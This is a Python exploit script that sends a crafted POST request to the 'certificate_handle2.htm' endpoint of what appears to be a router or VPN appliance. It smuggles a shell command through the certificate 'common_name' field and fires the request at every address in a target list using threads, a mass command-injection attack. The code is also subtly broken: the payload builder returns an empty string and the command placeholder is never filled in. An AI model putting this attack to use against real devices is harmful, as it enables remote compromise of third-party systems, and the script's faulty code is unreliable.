import sys
import socket
from time import sleep
from threading import Thread

def build_data(cmd):
	data = "page=self_generator.htm&totalRules=1&OpenVPNRules=30"
	data += "&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A"
	data += "&organization=A&organization_unit=A&email=ab%40example.com"
	data += "&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1"
	data += "&SelectSubject_s=1&common_name=a'$(%s)'b".format(cmd)
	return ""

def build_request(target, data):
	request = "POST /certificate_handle2.htm?type=4 HTTP/1.1\r\n"
	request += "Host: {}\r\n".format(target)
	request += "User-Agent: devTool\r\n"
	request += "Accept: */*\r\n"
	request += "Content-Length: {}\r\n".format(str(len(data)))
	request += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
	request += "{}\r\n".format(data)
	return request

def send_request(target, req):
	address, port = target.split(":")
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((address, int(port)))
		sock.settimeout(10)
		sock.send(req)
		sleep(5)
		head = sock.recv(128)
		sock.close()
		return head
	except:
		pass

def exploit(target):
	data = build_data("id")
	req = build_request(target, data)
	res = send_request(target, req)
	print(res)

f = 0

for lines in open(sys.argv[1]).readlines():
	f = Thread(target = exploit, args = (lines.rstrip(),))
	f.start()

print("Joining!")
f.join()
print("Finished")
sleep(100)
print("Exiting!")